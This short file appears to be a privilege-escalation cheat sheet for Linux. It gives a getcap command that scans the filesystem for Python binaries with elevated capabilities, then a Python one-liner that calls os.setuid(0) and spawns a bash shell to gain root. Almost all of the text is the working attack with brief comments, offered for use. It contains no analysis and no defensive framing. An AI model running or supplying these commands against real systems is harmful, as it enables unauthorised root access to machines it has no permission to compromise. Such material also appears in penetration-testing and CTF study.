# find out if there are python ver residing in the Linux env that has the capabilities set to '+ep' 
# +ep is representational of Effective Permissions, which allows for everything
# Use: getcap -r / 2>/dev/null



# use the following .py snippet to import os for leveraging operating system-dependent functionality
# setting the uid to (0) which is the id of root
# and upon obtaining the uid (0), spawn a bash shell with root priviliges
import os; 
os.setuid(0); 
os.system("/bin/bash")



/usr/bin/python_vulneralble_version -c 'import os; os.setuid(0); os.system("/bin/bash")'
